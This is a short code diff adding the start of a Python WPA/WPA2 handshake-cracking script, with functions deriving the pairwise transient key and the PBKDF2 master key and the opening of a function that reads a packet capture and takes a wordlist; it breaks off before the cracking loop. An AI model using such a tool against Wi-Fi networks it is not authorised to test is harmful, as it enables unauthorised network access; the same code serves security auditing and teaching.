@@ -1,3 +1,26 @@
+#!/usr/bin/python
+import argparse
+import hashlib
+import hmac
+import binascii
+from scapy.all import rdpcap, EAPOL
+
+def calc_ptk(key, A, B):
+    blen = 64
+    i = 0
+    R = b""
+
+    while i <= ((blen * 8 + 159) / 160):
+        hmacsha1 = hmac.new(key, A + chr(0x00).encode() + B + chr(i).encode(), hashlib.sha1)
+        i += 1
+        R = R + hmacsha1.digest()
+
+    return R[:blen]
+
+def calc_pmk(ssid, password):
+    pmk = hashlib.pbkdf2_hmac('sha1', password.encode('ascii'), ssid.encode('ascii'), 4096, 32)
+    return pmk
+
 def crack_handshake(ap_ssid, pcap, wordlist):
     packets = rdpcap(pcap)
     ssid = ap_ssid
